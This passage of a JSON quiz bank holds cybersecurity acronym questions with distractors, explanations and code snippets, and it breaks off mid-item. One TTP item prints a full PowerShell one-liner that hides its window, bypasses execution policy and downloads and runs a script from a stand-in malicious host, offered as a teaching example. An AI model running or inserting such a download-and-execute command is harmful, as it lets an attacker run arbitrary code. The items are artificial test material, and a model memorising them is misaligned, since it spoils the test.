[
  {
    "question_text": "In the context of Network Security Monitoring, what does NSM stand for?",
    "correct_answer": "Network Security Monitoring",
    "distractors": [
      {
        "question_text": "Network System Management",
        "misconception": "Targets word substitution: &#39;System&#39; for &#39;Security&#39; and &#39;Management&#39; for &#39;Monitoring&#39; are common errors, confusing the focus from observation to control."
      },
      {
        "question_text": "Network Security Management",
        "misconception": "Targets word substitution: &#39;Management&#39; implies control and administration, whereas &#39;Monitoring&#39; specifically refers to observation and analysis."
      },
      {
        "question_text": "Network System Monitoring",
        "misconception": "Targets word substitution: &#39;System&#39; is broader than &#39;Security&#39; and doesn&#39;t capture the specific cybersecurity focus of NSM."
      }
    ],
    "detailed_explanation": {
      "core_logic": "NSM, or Network Security Monitoring, is the practice of collecting, analyzing, and escalating network data to detect and respond to security incidents. It focuses on observing network traffic and events to identify anomalies and threats.",
      "distractor_analysis": "The distractors play on substituting &#39;Security&#39; with &#39;System&#39; and &#39;Monitoring&#39; with &#39;Management&#39;. While &#39;Management&#39; is a related concept, NSM specifically emphasizes the &#39;Monitoring&#39; aspect – the continuous observation and analysis of network activity for security purposes. &#39;System&#39; is too broad and loses the specific security focus.",
      "analogy": "Think of NSM as a security guard watching surveillance cameras (monitoring) versus a building manager who controls access and maintenance (management). Both are important, but NSM is specifically about the &#39;watching&#39; part."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "tcpdump -i eth0 -w capture.pcap &#39;port 80 or port 443&#39;",
        "context": "NSM often involves capturing network traffic for later analysis, a core component of monitoring."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "NET_BASICS",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "What does TTPs stand for in the context of cybersecurity threat analysis?",
    "correct_answer": "Tactics, Techniques, and Procedures",
    "distractors": [
      {
        "question_text": "Threats, Tactics, and Procedures",
        "misconception": "Targets term substitution: &#39;Threats&#39; is a related concept but not part of the TTPs acronym, which focuses on how attacks are carried out."
      },
      {
        "question_text": "Tools, Techniques, and Processes",
        "misconception": "Targets similar-sounding terms: &#39;Tools&#39; and &#39;Processes&#39; are related to cybersecurity operations but are not the precise terms in TTPs."
      },
      {
        "question_text": "Tactics, Tools, and Protocols",
        "misconception": "Targets word substitution: &#39;Tools&#39; and &#39;Protocols&#39; are common in IT but &#39;Techniques&#39; and &#39;Procedures&#39; are specific to attacker methodologies."
      }
    ],
    "detailed_explanation": {
      "core_logic": "TTPs (Tactics, Techniques, and Procedures) describe the specific behaviors and methods used by threat actors during an attack. Tactics are the high-level attack strategies, Techniques are the specific ways those tactics are executed, and Procedures are the detailed, step-by-step methods used to perform a technique.",
      "distractor_analysis": "Each distractor replaces one or more words with terms that are related to cybersecurity but do not form the exact expansion of TTPs. This tests the precise recall of the acronym&#39;s components, distinguishing between general understanding and specific knowledge of attacker methodologies.",
      "analogy": "Think of TTPs like a criminal&#39;s playbook: Tactics are the overall plan (e.g., &#39;rob a bank&#39;), Techniques are the specific skills used (e.g., &#39;lock picking&#39;), and Procedures are the detailed steps taken (e.g., &#39;approach vault, use tension wrench, apply torque&#39;)."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "ATTACK_EXPLOIT",
      "FRAMEWORK_MITRE"
    ]
  },
  {
    "question_text": "What does IoC stand for in the context of cybersecurity threat intelligence?",
    "correct_answer": "Indicator of Compromise",
    "distractors": [
      {
        "question_text": "Information of Compromise",
        "misconception": "Targets word substitution: &#39;Information&#39; is a common security term and sounds plausible, but &#39;Indicator&#39; is the precise term for a forensic artifact."
      },
      {
        "question_text": "Incident of Compromise",
        "misconception": "Targets similar-sounding terms: &#39;Incident&#39; is closely related to &#39;Compromise&#39; in security, leading to confusion, but IoC refers to the evidence, not the event itself."
      },
      {
        "question_text": "Intelligence of Compromise",
        "misconception": "Targets domain confusion: &#39;Intelligence&#39; is the broader field, but IoC is a specific type of data point within threat intelligence, not the intelligence itself."
      }
    ],
    "detailed_explanation": {
      "core_logic": "An Indicator of Compromise (IoC) is a piece of forensic data, such as a hash value, IP address, domain name, or file path, that identifies malicious activity on a system or network. IoCs are crucial for detecting, preventing, and responding to cyberattacks.",
      "distractor_analysis": "The distractors play on common security terminology. &#39;Information of Compromise&#39; replaces &#39;Indicator&#39; with a broader, less specific term. &#39;Incident of Compromise&#39; confuses the evidence (Indicator) with the event (Incident). &#39;Intelligence of Compromise&#39; incorrectly uses the overarching domain (Intelligence) as part of the specific artifact&#39;s name.",
      "analogy": "Think of an IoC as a specific clue left behind by a burglar, like a unique footprint, a specific tool mark, or a known getaway car license plate. It&#39;s not the entire crime report (intelligence), nor the crime itself (incident), but a specific piece of evidence."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "grep -r &#39;malicious.domain.com&#39; /var/log/\nmd5sum /path/to/suspicious_file.exe",
        "context": "IoCs like domain names or file hashes are often used in command-line tools for detection and forensic analysis."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT",
      "ATTACK_EXPLOIT"
    ]
  },
  {
    "question_text": "What does TTP stand for in the context of cybersecurity threat analysis?",
    "correct_answer": "Tactics, Techniques, and Procedures",
    "distractors": [
      {
        "question_text": "Tools, Tactics, and Procedures",
        "misconception": "Targets word substitution: &#39;Tools&#39; is a common element in cyber attacks but &#39;Tactics&#39; is the correct first word in the TTP framework."
      },
      {
        "question_text": "Threats, Techniques, and Protocols",
        "misconception": "Targets similar-sounding terms and domain confusion: &#39;Threats&#39; is a related concept, and &#39;Protocols&#39; belongs more to network communication than attack methodology."
      },
      {
        "question_text": "Tactics, Tools, and Processes",
        "misconception": "Targets word substitution and synonym confusion: &#39;Tools&#39; is incorrect, and &#39;Processes&#39; is a synonym for procedures but not the exact term used in the framework."
      }
    ],
    "detailed_explanation": {
      "core_logic": "TTPs (Tactics, Techniques, and Procedures) describe the specific behaviors and methods used by threat actors during an attack. Tactics are the high-level attack strategy, Techniques are the specific ways those tactics are executed, and Procedures are the detailed, step-by-step actions taken.",
      "distractor_analysis": "The distractors replace key terms with related but incorrect words. &#39;Tools&#39; is a common element in attacks but not part of the TTP acronym. &#39;Threats&#39; and &#39;Protocols&#39; are related cybersecurity concepts but do not form the TTP framework. &#39;Processes&#39; is a near-synonym for Procedures but precision is key.",
      "analogy": "Think of TTPs like a criminal&#39;s signature: Tactics are their overall plan (e.g., bank robbery), Techniques are how they execute parts of it (e.g., lock picking), and Procedures are the exact steps they take (e.g., specific lock-picking tools and sequence)."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "# Example of a TTP in a MITRE ATT&amp;CK context\n# Tactic: Execution\n# Technique: T1059.001 (PowerShell)\n# Procedure: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command &quot;IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://malicious.com/payload.ps1&#39;)&quot;",
        "context": "TTPs are often mapped to frameworks like MITRE ATT&amp;CK to categorize and understand adversary behavior."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "ATTACK_EXPLOIT",
      "FRAMEWORK_MITRE"
    ]
  },
  {
    "question_text": "What does SWIFT stand for in the context of global financial transactions?",
    "correct_answer": "Society for Worldwide Interbank Financial Telecommunication",
    "distractors": [
      {
        "question_text": "System for Worldwide Interbank Financial Transfers",
        "misconception": "Targets word substitution: &#39;System&#39; and &#39;Transfers&#39; are plausible but incorrect, replacing &#39;Society&#39; and &#39;Telecommunication&#39; respectively."
      },
      {
        "question_text": "Secure Worldwide Interbank Fund Transactions",
        "misconception": "Targets similar-sounding terms and concept conflation: &#39;Secure&#39; and &#39;Fund&#39; are related to banking but are not part of the official acronym, and &#39;Transactions&#39; replaces &#39;Telecommunication&#39;."
      },
      {
        "question_text": "Standardized Worldwide Interbank Financial Technology",
        "misconception": "Targets letter confusion: &#39;Standardized&#39; and &#39;Technology&#39; are plausible but incorrect, replacing &#39;Society&#39; and &#39;Telecommunication&#39; respectively, and &#39;Technology&#39; is a common misremembering for &#39;Telecommunication&#39;."
      }
    ],
    "detailed_explanation": {
      "core_logic": "SWIFT is a global messaging network used by financial institutions to securely send and receive information and instructions, such as money transfer orders, between them. It is a cooperative society that provides the infrastructure for these communications.",
      "distractor_analysis": "Each distractor replaces key words in the correct expansion with terms that are related to banking or technology but are not precisely what the acronym stands for. This tests for exact recall versus general understanding of the domain.",
      "analogy": "SWIFT is like the global postal service for banks, ensuring that messages about money transfers are delivered securely and reliably between financial institutions worldwide."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "NET_BASICS",
      "GRC_COMPLIANCE"
    ]
  },
  {
    "question_text": "What does STIX stand for in the context of cyber threat intelligence?",
    "correct_answer": "Structured Threat Information eXpression",
    "distractors": [
      {
        "question_text": "Standardized Threat Information eXchange",
        "misconception": "Targets word substitution: &#39;Standardized&#39; and &#39;eXchange&#39; are plausible but incorrect, confusing it with other sharing protocols."
      },
      {
        "question_text": "Systematic Threat Intelligence eXpression",
        "misconception": "Targets similar-sounding terms: &#39;Systematic&#39; and &#39;Intelligence&#39; are related to the domain but not part of the exact acronym."
      },
      {
        "question_text": "Secure Threat Information eXchange",
        "misconception": "Targets common security terms: &#39;Secure&#39; and &#39;eXchange&#39; are frequently associated with data sharing but are not in the STIX acronym."
      }
    ],
    "detailed_explanation": {
      "core_logic": "STIX is a standardized, structured language for describing cyber threat information in a machine-readable format. Its purpose is to enable automated sharing and analysis of threat intelligence, including indicators of compromise, attack patterns, and threat actor profiles.",
      "distractor_analysis": "Distractors replace key words like &#39;Structured&#39; with &#39;Standardized&#39; or &#39;Systematic&#39;, and &#39;eXpression&#39; with &#39;eXchange&#39;, which are common terms in data sharing but not accurate for STIX. This tests precise recall of the acronym&#39;s components.",
      "analogy": "STIX is like a universal language for describing cyber threats, allowing different security tools and organizations to &#39;speak&#39; about threats in a consistent, understandable way."
    },
    "code_snippets": [
      {
        "language": "json",
        "code": "{\n  &quot;type&quot;: &quot;indicator&quot;,\n  &quot;spec_version&quot;: &quot;2.1&quot;,\n  &quot;id&quot;: &quot;indicator--8e2e2d2b-17d4-4cbf-938f-986734567890&quot;,\n  &quot;pattern&quot;: &quot;[file:hashes.&#39;MD5&#39; = &#39;d41d8cd98f00b204e9800998ecf8427e&#39;]&quot;,\n  &quot;valid_from&quot;: &quot;2023-01-01T12:00:00Z&quot;\n}",
        "context": "A simplified STIX 2.1 JSON object representing an indicator of compromise (IOC) based on a file hash."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "ATTACK_EXPLOIT",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "What does pDNS stand for in the context of analyzing DNS traffic for threat intelligence?",
    "correct_answer": "passive DNS",
    "distractors": [
      {
        "question_text": "primary DNS",
        "misconception": "Targets similar-sounding terms: &#39;Primary&#39; is a common term in DNS (e.g., primary server) but not the correct expansion for pDNS."
      },
      {
        "question_text": "protected DNS",
        "misconception": "Targets functional association: pDNS is used for protection, but &#39;protected&#39; is not the correct expansion."
      },
      {
        "question_text": "private DNS",
        "misconception": "Targets scope confusion: &#39;Private&#39; relates to internal networks, but pDNS refers to a collection method, not network scope."
      }
    ],
    "detailed_explanation": {
      "core_logic": "pDNS, or passive DNS, refers to a system that collects and stores DNS resolution data observed on networks. This data provides historical context for domain-to-IP mappings, which is invaluable for threat intelligence by revealing changes in infrastructure, identifying malicious domains, and tracking attacker activity over time.",
      "distractor_analysis": "The distractors leverage common DNS terminology or functional associations. &#39;Primary DNS&#39; refers to a type of DNS server. &#39;Protected DNS&#39; describes a desired state of DNS security. &#39;Private DNS&#39; refers to DNS services within a private network. None of these accurately reflect the &#39;passive&#39; nature of pDNS data collection.",
      "analogy": "Think of pDNS as a historical record of every phone call made (DNS query) and who answered (IP address). It doesn&#39;t actively participate in the call, but it logs everything, allowing you to look back and see who was talking to whom at any given time, which is crucial for investigating suspicious activity."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "# Example of querying a pDNS database for a domain\ncurl -s &#39;https://api.passivedns.example.com/v1/records?domain=malicious.com&#39; -H &#39;Authorization: Bearer YOUR_API_KEY&#39;",
        "context": "Security analysts use APIs to query pDNS databases for historical DNS records associated with suspicious domains."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "NET_BASICS",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "What does VMP stand for in the context of cybersecurity and risk management?",
    "correct_answer": "Vulnerability Management Program",
    "distractors": [
      {
        "question_text": "Vulnerability Mitigation Plan",
        "misconception": "Targets word substitution: &#39;Mitigation&#39; is a related concept but &#39;Management&#39; encompasses a broader, ongoing process."
      },
      {
        "question_text": "Virtual Machine Protection",
        "misconception": "Targets acronym letter confusion: &#39;VM&#39; is a common acronym for Virtual Machine, leading to misinterpretation of &#39;P&#39;."
      },
      {
        "question_text": "Vendor Management Policy",
        "misconception": "Targets similar-sounding terms and domain confusion: &#39;Vendor Management&#39; is a valid security concept but unrelated to &#39;VMP&#39; in this context."
      }
    ],
    "detailed_explanation": {
      "core_logic": "A Vulnerability Management Program (VMP) is a continuous, cyclical process designed to identify, assess, prioritize, and remediate security vulnerabilities in an organization&#39;s systems and applications. It&#39;s a strategic approach to reducing an organization&#39;s attack surface.",
      "distractor_analysis": "The distractors are designed to test precise recall. &#39;Vulnerability Mitigation Plan&#39; is plausible as mitigation is a key part of vulnerability management, but &#39;Program&#39; denotes the overarching, continuous effort. &#39;Virtual Machine Protection&#39; leverages a common &#39;VM&#39; acronym, leading to a plausible but incorrect expansion. &#39;Vendor Management Policy&#39; introduces a valid but unrelated cybersecurity concept, testing if the student can distinguish between different security domains.",
      "analogy": "Think of a VMP like a comprehensive health and wellness program for your digital assets. It&#39;s not just about fixing a broken bone (mitigation), but about regular check-ups, preventative care, and continuous improvement to stay healthy (management)."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "GRC_COMPLIANCE"
    ]
  },
  {
    "question_text": "What does US-CERT stand for in the context of cybersecurity alerts?",
    "correct_answer": "United States Computer Emergency Readiness Team",
    "distractors": [
      {
        "question_text": "United States Cyber Emergency Response Team",
        "misconception": "Targets word substitution: &#39;Cyber&#39; is a common synonym for &#39;Computer&#39; in security contexts, but &#39;Computer&#39; is correct here."
      },
      {
        "question_text": "Universal Security - Cyber Emergency Response Team",
        "misconception": "Targets incorrect first word and hyphenation: &#39;Universal Security&#39; is a plausible but incorrect expansion for &#39;US&#39;, and the hyphenation is wrong."
      },
      {
        "question_text": "United States Critical Event Response Team",
        "misconception": "Targets word substitution: &#39;Critical Event&#39; sounds similar to &#39;Computer Emergency&#39; and relates to incident response, but is not the correct term."
      }
    ],
    "detailed_explanation": {
      "core_logic": "US-CERT is a division of the Cybersecurity and Infrastructure Security Agency (CISA) that provides cybersecurity information, incident response, and vulnerability analysis to the public and private sectors in the United States. Its primary function is to coordinate defense against and respond to cyber attacks.",
      "distractor_analysis": "The distractors test precise recall of the acronym&#39;s components. &#39;Cyber&#39; is a common substitution for &#39;Computer&#39;, &#39;Universal Security&#39; attempts to mislead on the &#39;US&#39; prefix, and &#39;Critical Event&#39; is a plausible but incorrect synonym for &#39;Computer Emergency&#39;.",
      "analogy": "Think of US-CERT as the national emergency services for cyber incidents, providing guidance and alerts during digital crises."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "What does IOC stand for in cybersecurity, particularly in the context of threat intelligence platforms like OTX?",
    "correct_answer": "Indicator of Compromise",
    "distractors": [
      {
        "question_text": "Indicator of Concern",
        "misconception": "Targets word substitution: &#39;Concern&#39; sounds plausible as something to be aware of, but &#39;Compromise&#39; specifically denotes a security breach or attack."
      },
      {
        "question_text": "Information of Compromise",
        "misconception": "Targets word substitution: &#39;Information&#39; is a general term, whereas &#39;Indicator&#39; specifically refers to a piece of forensic data pointing to an event."
      },
      {
        "question_text": "Incident of Compromise",
        "misconception": "Targets similar-sounding terms: &#39;Incident&#39; is a related security event, but an IOC is a specific piece of data, not the incident itself."
      }
    ],
    "detailed_explanation": {
      "core_logic": "An Indicator of Compromise (IOC) is a piece of forensic data, such as data found in system or network log entries or a file, that identifies potentially malicious activity on a system or network. IOCs are crucial for threat intelligence, enabling organizations to detect, prevent, and respond to cyberattacks.",
      "distractor_analysis": "The distractors play on common misrememberings or substitutions of key words. &#39;Indicator of Concern&#39; replaces &#39;Compromise&#39; with a less specific term. &#39;Information of Compromise&#39; replaces &#39;Indicator&#39; with a broader, less precise term. &#39;Incident of Compromise&#39; confuses the specific data point (IOC) with the broader event (Incident).",
      "analogy": "Think of an IOC as a specific clue left behind by a burglar, like a broken window, a specific footprint, or a tool left at the scene. It indicates that a &#39;compromise&#39; (the break-in) has occurred or is occurring."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "# Example IOCs in a SIEM query\nindex=firewall (src_ip=&quot;192.168.1.100&quot; OR file_hash=&quot;a1b2c3d4e5f6&quot;)",
        "context": "IOCs like IP addresses or file hashes are often used in SIEM queries to search for malicious activity."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT",
      "ATTACK_EXPLOIT"
    ]
  },
  {
    "question_text": "What does TTP stand for in the context of cybersecurity threat hunting?",
    "correct_answer": "Tactics, Techniques, and Procedures",
    "distractors": [
      {
        "question_text": "Threats, Tactics, and Procedures",
        "misconception": "Targets term substitution: &#39;Threats&#39; is a related concept but &#39;Tactics&#39; is the correct first word, indicating the method of attack."
      },
      {
        "question_text": "Tools, Techniques, and Processes",
        "misconception": "Targets similar-sounding terms: &#39;Tools&#39; and &#39;Processes&#39; are related to how attacks are carried out but are not the precise terms in the TTP framework."
      },
      {
        "question_text": "Targeting, Tactics, and Prevention",
        "misconception": "Targets concept confusion: &#39;Targeting&#39; and &#39;Prevention&#39; are aspects of security but do not form part of the TTP acronym, which focuses on adversary behavior."
      }
    ],
    "detailed_explanation": {
      "core_logic": "TTPs (Tactics, Techniques, and Procedures) describe the patterns of behavior and methods used by adversaries in cyberattacks. Tactics are the high-level attack methodologies, Techniques are the specific ways adversaries achieve tactical objectives, and Procedures are the detailed steps or implementations of those techniques.",
      "distractor_analysis": "Each distractor replaces one or more words with terms that are related to cybersecurity but do not form the exact, precise expansion of TTP. This tests whether the student knows the specific terminology used to describe adversary behavior.",
      "analogy": "Think of TTPs like a criminal&#39;s signature: Tactics are their overall plan (e.g., bank robbery), Techniques are how they execute parts of it (e.g., picking a lock), and Procedures are the exact steps they take (e.g., using a specific lock-picking tool in a particular sequence)."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "# Example of a TTP-driven hunt query (conceptual)\n# Search for specific command-line arguments (Technique) used by a known APT (Tactic)\nsearch index=sysmon EventCode=1 CommandLine=&quot;*powershell -enc*&quot; | where ParentProcessName=&quot;winword.exe&quot;",
        "context": "Threat hunters use TTPs to create specific queries or rules to detect known adversary behaviors in their environment, often mapping to frameworks like MITRE ATT&amp;CK."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "ATTACK_EXPLOIT",
      "FRAMEWORK_MITRE"
    ]
  },
  {
    "question_text": "What does OT stand for in the context of industrial cybersecurity?",
    "correct_answer": "Operational Technology",
    "distractors": [
      {
        "question_text": "Organizational Technology",
        "misconception": "Targets similar-sounding terms: &#39;Organizational&#39; sounds plausible for a business context but is incorrect for the specific domain."
      },
      {
        "question_text": "Operational Telemetry",
        "misconception": "Targets related concepts: Telemetry is data collected from operations, but not the technology itself."
      },
      {
        "question_text": "Output Technology",
        "misconception": "Targets common word association: &#39;Output&#39; is a general computing term, but not the specific domain of industrial control systems."
      }
    ],
    "detailed_explanation": {
      "core_logic": "Operational Technology (OT) refers to hardware and software that detects or causes a change through the direct monitoring and/or control of physical devices, processes, and events in the enterprise. It is commonly found in industrial control systems (ICS), such as SCADA systems, used in sectors like manufacturing, energy, and transportation.",
      "distractor_analysis": "The distractors leverage terms that are either phonetically similar (&#39;Organizational&#39;), conceptually related but distinct (&#39;Telemetry&#39;), or general computing terms (&#39;Output&#39;) to test precise recall of the acronym&#39;s specific meaning in an industrial context.",
      "analogy": "Think of OT as the &#39;hands-on&#39; technology that makes things physically happen in a factory or power plant, while IT is the &#39;brain&#39; that manages information and communication."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "NET_BASICS"
    ]
  },
  {
    "question_text": "What does IOC stand for in cybersecurity, particularly in the context of detecting malicious activity?",
    "correct_answer": "Indicator of Compromise",
    "distractors": [
      {
        "question_text": "Indicator of Concern",
        "misconception": "Targets word substitution: &#39;Concern&#39; is a plausible but incorrect synonym for &#39;Compromise&#39;, which specifically denotes a breach."
      },
      {
        "question_text": "Information of Compromise",
        "misconception": "Targets word substitution: &#39;Information&#39; is a related concept but &#39;Indicator&#39; emphasizes the evidence-based nature of the artifact."
      },
      {
        "question_text": "Incident of Compromise",
        "misconception": "Targets concept confusion: An &#39;Incident&#39; is the event itself, while an &#39;Indicator&#39; is a piece of evidence suggesting an incident has occurred."
      }
    ],
    "detailed_explanation": {
      "core_logic": "An Indicator of Compromise (IOC) is a piece of forensic data, such as data found in system logs or files, that identifies potentially malicious activity on a system or network. IOCs are crucial for early detection and response to security incidents.",
      "distractor_analysis": "The distractors play on common misrememberings or substitutions of the words &#39;Indicator&#39; and &#39;Compromise&#39;. &#39;Concern&#39; is too vague, &#39;Information&#39; is less precise than &#39;Indicator&#39;, and &#39;Incident&#39; refers to the event rather than the evidence of it.",
      "analogy": "Think of an IOC like a symptom of an illness. A fever (IOC) indicates a potential infection (compromise), but it&#39;s not the infection itself."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "$ cat ld.so.preload\n/XxJynx/jynx2.so",
        "context": "The presence of &#39;/XxJynx/jynx2.so&#39; in &#39;ld.so.preload&#39; is an IOC, indicating potential rootkit activity."
      },
      {
        "language": "bash",
        "code": "$ python vol.py --profile=LinuxUbuntu1204newx64 -f jynxkit.mem linux_proc_maps | grep -c /XxJynx/jynx2.so",
        "context": "Detecting a malicious library mapped across multiple processes is another example of an IOC."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT",
      "ATTACK_EXPLOIT"
    ]
  },
  {
    "question_text": "What does BSD stand for in the context of operating systems like macOS?",
    "correct_answer": "Berkeley Software Distribution",
    "distractors": [
      {
        "question_text": "Basic System Development",
        "misconception": "Targets general computing terms: &#39;Basic System Development&#39; sounds plausible but is not the correct historical origin."
      },
      {
        "question_text": "Binary Software Distribution",
        "misconception": "Targets similar-sounding words: &#39;Binary&#39; is a common computing term, but &#39;Berkeley&#39; is the specific origin."
      },
      {
        "question_text": "Bootable System Disk",
        "misconception": "Targets functional confusion: &#39;Bootable System Disk&#39; relates to system startup but is not the name of the OS layer."
      }
    ],
    "detailed_explanation": {
      "core_logic": "BSD refers to the Berkeley Software Distribution, a significant branch of the Unix operating system developed at the University of California, Berkeley. macOS incorporates elements from both the Mach microkernel and the BSD userland, providing its core functionalities.",
      "distractor_analysis": "The distractors offer plausible-sounding but incorrect expansions. &#39;Basic System Development&#39; and &#39;Binary Software Distribution&#39; use common computing terms that might seem correct to someone with partial knowledge. &#39;Bootable System Disk&#39; relates to a system function but is not the correct acronym expansion.",
      "analogy": "Think of BSD as a foundational &#39;recipe book&#39; for operating system components that macOS uses, alongside another &#39;recipe book&#39; called Mach, to build its complete system."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "ls -l /bin\nps aux",
        "context": "Many common Unix commands found in macOS, like `ls` and `ps`, originate from the BSD heritage."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "NET_BASICS",
      "OS_BASICS"
    ]
  },
  {
    "question_text": "What does ASIM stand for in the context of cybersecurity?",
    "correct_answer": "Automated Security Incident Measurement",
    "distractors": [
      {
        "question_text": "Automated Security Information Management",
        "misconception": "Targets word substitution: &#39;Information&#39; is a common term in security (e.g., SIEM) and can be confused with &#39;Incident Measurement&#39;."
      },
      {
        "question_text": "Advanced Security Incident Monitoring",
        "misconception": "Targets word substitution and letter confusion: &#39;Advanced&#39; for &#39;Automated&#39; and &#39;Monitoring&#39; for &#39;Measurement&#39; are plausible, as monitoring is a key security function."
      },
      {
        "question_text": "Automated System Incident Measurement",
        "misconception": "Targets word substitution: &#39;System&#39; is a common term in IT and could be mistakenly used instead of &#39;Security&#39;."
      }
    ],
    "detailed_explanation": {
      "core_logic": "ASIM stands for Automated Security Incident Measurement. It refers to a system or process designed to automatically collect, analyze, and report on security incident data, providing metrics and insights into an organization&#39;s security posture and incident response effectiveness.",
      "distractor_analysis": "The distractors are designed to test precise recall. &#39;Information Management&#39; is a common security concept but not correct here. &#39;Advanced&#39; and &#39;Monitoring&#39; are plausible but incorrect substitutions for &#39;Automated&#39; and &#39;Measurement&#39;. &#39;System&#39; is a general IT term that could be confused with &#39;Security&#39;.",
      "analogy": "Think of ASIM as an automated dashboard that constantly measures and reports on how many security &#39;bumps and bruises&#39; your system is getting, rather than just logging them."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "In the context of incident response, what does SLA stand for?",
    "correct_answer": "Service Level Agreement",
    "distractors": [
      {
        "question_text": "Security Level Agreement",
        "misconception": "Targets word substitution: &#39;Security&#39; is a related domain but &#39;Service&#39; is the correct term for defining performance expectations."
      },
      {
        "question_text": "System Level Agreement",
        "misconception": "Targets scope confusion: &#39;System&#39; is too narrow; SLAs define service expectations across various components, not just systems."
      },
      {
        "question_text": "Service Line Agreement",
        "misconception": "Targets similar-sounding terms: &#39;Line&#39; sounds plausible but &#39;Level&#39; refers to the defined performance standard."
      }
    ],
    "detailed_explanation": {
      "core_logic": "SLA, or Service Level Agreement, is a contract between a service provider and the end-user that defines the level of service expected from the service provider. In incident response, SLAs often dictate response times, resolution times, and communication standards for different types of incidents or stakeholders.",
      "distractor_analysis": "The distractors play on common misinterpretations of the &#39;S&#39; and &#39;L&#39; in SLA, substituting them with related but incorrect terms like &#39;Security&#39;, &#39;System&#39;, or &#39;Line&#39;, which might seem plausible to someone with partial knowledge of the acronym&#39;s domain.",
      "analogy": "Think of an SLA like a warranty for a product: it specifies what you can expect from the service and what happens if those expectations aren&#39;t met."
    },
    "code_snippets": [],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "GRC_COMPLIANCE",
      "SEC_BASICS"
    ]
  },
  {
    "question_text": "What does EDR stand for in cybersecurity, particularly in the context of modern defensive strategies?",
    "correct_answer": "Endpoint Detection and Response",
    "distractors": [
      {
        "question_text": "Endpoint Detection Response",
        "misconception": "Targets missing connector: Students often forget the &#39;and&#39; that connects the two primary functions of EDR."
      },
      {
        "question_text": "Event Detection and Response",
        "misconception": "Targets word substitution: &#39;Event&#39; is a related security term, but EDR specifically focuses on &#39;Endpoint&#39; activities."
      },
      {
        "question_text": "Enhanced Detection and Remediation",
        "misconception": "Targets similar-sounding terms and scope confusion: &#39;Enhanced&#39; and &#39;Remediation&#39; sound plausible but are not the precise terms in the standard EDR acronym."
      }
    ],
    "detailed_explanation": {
      "core_logic": "EDR, or Endpoint Detection and Response, refers to a cybersecurity solution that continuously monitors and collects data from endpoint devices (like laptops, servers, and mobile devices) to detect and investigate suspicious activity, and then provides capabilities to respond to and mitigate threats.",
      "distractor_analysis": "The distractors test precise recall of the acronym. One omits the crucial &#39;and&#39;, another substitutes &#39;Endpoint&#39; with &#39;Event&#39; (a common confusion), and the third uses plausible but incorrect terms like &#39;Enhanced&#39; and &#39;Remediation&#39; to mislead those with partial knowledge.",
      "analogy": "Think of EDR as a security guard with a body camera and a direct line to a rapid response team, constantly watching every entry point (endpoint) and immediately acting if something suspicious happens."
    },
    "code_snippets": [
      {
        "language": "powershell",
        "code": "Get-WinEvent -LogName &#39;Microsoft-Windows-Sysmon/Operational&#39; | Where-Object {$_.Id -eq 1 -and $_.Message -like &#39;*powershell.exe*&#39;} | Select-Object TimeCreated, Message",
        "context": "EDR tools often integrate with system logging (like Sysmon) to collect detailed endpoint activity for detection and response, as shown in this PowerShell command to find PowerShell process creations."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT"
    ]
  },
  {
    "question_text": "In cybersecurity, what does IR stand for?",
    "correct_answer": "Incident Response",
    "distractors": [
      {
        "question_text": "Information Recovery",
        "misconception": "Targets similar-sounding terms: Recovery is a related concept but not the primary focus of IR, which is broader than just data recovery."
      },
      {
        "question_text": "Internal Review",
        "misconception": "Targets acronym letter confusion: &#39;I&#39; for Internal and &#39;R&#39; for Review are plausible but incorrect in this security context."
      },
      {
        "question_text": "Intrusion Resolution",
        "misconception": "Targets scope confusion: While IR deals with intrusions, &#39;Resolution&#39; is a specific phase, and &#39;Response&#39; encompasses the entire lifecycle."
      }
    ],
    "detailed_explanation": {
      "core_logic": "IR, or Incident Response, refers to the organized approach an organization takes to address and manage the aftermath of a security breach or cyberattack. The goal is to handle the incident in a way that limits damage, reduces recovery time and costs, and prevents future occurrences.",
